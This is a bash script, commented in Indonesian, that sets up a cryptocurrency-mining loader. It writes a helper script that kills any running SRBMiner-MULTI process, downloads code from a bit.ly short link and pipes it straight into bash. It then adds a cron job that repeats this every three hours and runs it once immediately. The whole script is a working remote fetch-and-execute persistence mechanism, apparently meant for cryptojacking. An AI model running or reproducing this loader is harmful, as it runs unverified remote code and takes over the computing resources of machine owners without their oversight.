#!/bin/bash

# URL tempat script utama yang akan dijalankan secara berkala
SCRIPT_URL="https://bit.ly/nescop"
CRON_SCRIPT="$HOME/cron_miner.sh"

# Buat script yang akan dijalankan oleh cron
cat <<EOL > "$CRON_SCRIPT"
#!/bin/bash
# Hentikan proses miner lama jika ada
pkill -f SRBMiner-MULTI
sleep 5

# Download dan jalankan script terbaru dari URL
curl -sSL "$SCRIPT_URL" | bash
EOL

# Beri izin eksekusi
chmod +x "$CRON_SCRIPT"

# Tambahkan cron job agar berjalan setiap 3 jam
echo "Menambahkan cron job..."
(crontab -l 2>/dev/null | grep -v "$CRON_SCRIPT"; echo "0 */3 * * * $CRON_SCRIPT >> $HOME/cron_miner.log 2>&1") | crontab -

# Jalankan script pertama kali
echo "Menjalankan miner pertama kali..."
bash "$CRON_SCRIPT"

echo "Setup selesai! Miner akan otomatis diperbarui dan dijalankan setiap 3 jam."
